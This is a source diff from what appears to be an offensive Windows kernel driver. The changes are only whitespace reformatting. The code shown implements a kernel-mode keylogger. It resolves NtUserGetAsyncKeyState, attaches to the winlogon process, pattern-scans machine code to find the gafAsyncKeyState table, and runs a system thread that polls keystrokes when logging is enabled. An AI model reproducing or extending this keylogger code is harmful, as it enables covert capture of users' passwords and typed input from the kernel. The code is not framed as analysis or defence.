@@ -422,54 +422,54 @@ BeGetGafAsyncKeyStateAddress()
     // Get Address of NtUserGetAsyncKeyState
     //
     DWORD64 NtUserGetAsyncKeyState = (DWORD64)BeGetSystemRoutineAddress("win32kbase.sys", "NtUserGetAsyncKeyState");
-	LOG_MSG("NtUserGetAsyncKeyState: 0x%llx\n", NtUserGetAsyncKeyState);
-	
+    LOG_MSG("NtUserGetAsyncKeyState: 0x%llx\n", NtUserGetAsyncKeyState);
+    
     //
     // To read session driver modules (such as win32kbase.sys, which contains NtUserGetAsyncKeyState), we need a process running in a user session 
     // https://www.unknowncheats.me/forum/general-programming-and-reversing/492970-reading-memory-win32kbase-sys.html
     //
-	KeStackAttachProcess(BeGlobals::winLogonProc, &Apc);
+    KeStackAttachProcess(BeGlobals::winLogonProc, &Apc);
 
-	PVOID Address = 0;
-	INT   I       = 0;
+    PVOID Address = 0;
+    INT   I       = 0;
 
     //
     // Resolve gafAsyncKeyState address
     //
-	for (; I < 500; ++I)
-	{
-		if (
-			*(BYTE*)(NtUserGetAsyncKeyState + I) == MOV_RAX_QWORD_BYTE1
-			&& *(BYTE*)(NtUserGetAsyncKeyState + I + 1) == MOV_RAX_QWORD_BYTE2
-			&& *(BYTE*)(NtUserGetAsyncKeyState + I + 2) == MOV_RAX_QWORD_BYTE3
-		)
-		{
+    for (; I < 500; ++I)
+    {
+        if (
+            *(BYTE*)(NtUserGetAsyncKeyState + I) == MOV_RAX_QWORD_BYTE1
+            && *(BYTE*)(NtUserGetAsyncKeyState + I + 1) == MOV_RAX_QWORD_BYTE2
+            && *(BYTE*)(NtUserGetAsyncKeyState + I + 2) == MOV_RAX_QWORD_BYTE3
+        )
+        {
             //
             // param for MOV RAX QWORD PTR is the offset to the address of 
             //
-			UINT32 Offset = (*(PUINT32)(NtUserGetAsyncKeyState + I + 3));
+            UINT32 Offset = (*(PUINT32)(NtUserGetAsyncKeyState + I + 3));
             
             //
             // 4 = length of offset value
             //
             Address = (PVOID)(NtUserGetAsyncKeyState + I + 3 + 4 + Offset);
-			
+    
             LOG_MSG("%02X %02X %02X %lx\n", *(BYTE*)(NtUserGetAsyncKeyState + I), *(BYTE*)(NtUserGetAsyncKeyState + I + 1), *(BYTE*)(NtUserGetAsyncKeyState + I + 2), Offset);
-			break;
-		}
-	}
+            break;
+        }
+    }
 
-	if (Address == 0)
-	{
-		LOG_MSG("Could not resolve gafAsyncKeyState...\n");
-	}
-	else
-	{
-		LOG_MSG("Found address to gafAsyncKeyState at offset [NtUserGetAsyncKeyState]+%i: 0x%llx\n", (INT)I, (ULONG_PTR)Address);
-	}
+    if (Address == 0)
+    {
+        LOG_MSG("Could not resolve gafAsyncKeyState...\n");
+    }
+    else
+    {
+        LOG_MSG("Found address to gafAsyncKeyState at offset [NtUserGetAsyncKeyState]+%i: 0x%llx\n", (INT)I, (ULONG_PTR)Address);
+    }
 
-	KeUnstackDetachProcess(&Apc);
-	return Address;
+    KeUnstackDetachProcess(&Apc);
+    return Address;
 }
 
 /*
@@ -486,9 +486,9 @@ BeKeyLoggerFunction(_In_ PVOID StartContext)
 
     while(true)
     {
-	    if (BeGlobals::LogKeys)
-	    {
-		    BeUpdateKeyStateMap(BeGlobals::WinLogonPid, GasAsyncKeyStateAddr);
+        if (BeGlobals::LogKeys)
+        {
+            BeUpdateKeyStateMap(BeGlobals::WinLogonPid, GasAsyncKeyStateAddr);
 
             //
             // Just a poc :)
@@ -503,7 +503,7 @@ BeKeyLoggerFunction(_In_ PVOID StartContext)
     if (BeGlobals::Shutdown)
     {
         KeSetEvent(&BeGlobals::hKeyLoggerTerminationEvent, IO_NO_INCREMENT, FALSE);
-	    PsTerminateSystemThread(STATUS_SUCCESS);
+        PsTerminateSystemThread(STATUS_SUCCESS);
     }
 
     //
